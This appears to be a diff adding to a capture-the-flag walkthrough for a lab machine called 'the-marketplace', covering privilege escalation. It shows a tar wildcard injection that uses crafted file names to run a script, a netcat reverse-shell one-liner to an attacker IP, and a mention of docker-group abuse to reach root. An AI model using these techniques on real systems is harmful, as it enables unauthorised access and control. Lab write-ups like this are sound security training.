@@ -260,8 +260,45 @@ Matching Defaults entries for jake on the-marketplace:
 User jake may run the following commands on the-marketplace:
     (michael) NOPASSWD: /opt/backups/backup.sh
 ```
---> We are able to run file ./backup.sh without passwod permission user michael
+--> We are able to run file ./backup.sh with permission user michael but no password.
 + Go to /opt/backups:
 	
+![alt text](image-24.png)
 
++ After try run sudo, we guess that we can not priv to root because user "jake" can not run sudo permission in the marketplace.
++ Idea: Base in "sudo -l", we can priv to user "michael" and after that we can find way to priv user "root".
++ After seen bash code in backup.sh, we think about to exploit "Wildcard" to priv user michael.
++ Firstly, we create file for exploitation:
 
+```bash
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.101.46 1234 > /tmp/f" > shell.sh
+chmod 777 shell.sh
+```
+
++ After run first time ./backup.sh with permission user michael, we knew file backup.tar belong to permission jake so when we run backup.sh then backup.sh will spawn another backup.tar but can not overwrite file .tar because file backup.tar is with permission user jake.
++ So we need to remove file backup.tar with permission user jake and run again. In this time, backup.sh will spawn backup.tar with permission michael.
++ We use netcat to catch the open listner:
+
+```bash
+jake@the-marketplace:/opt/backups$ sudo -u michael ./backup.sh 
+Backing up files...
+tar: backup.tar: file is the archive; not dumped
+```
+![alt text](image-25.png)
+
++ Now we are able to priv "root".
++ Seeing into id, we will see 999(docker).
++ This is a hint that we can use to priv. Firstly, we need to check docker imagine to find what image we can use to run docker.
++ Because we is not running interactive shell so we can run python3 to spawn full interactive shell:
+
+![alt text](image-26.png)
+
+--> Great!!! We found docker have repo "alpine". We are able to use it to spawn shell
+
+![alt text](image-27.png)
+
+![alt text](image-28.png)
+
+END!!!
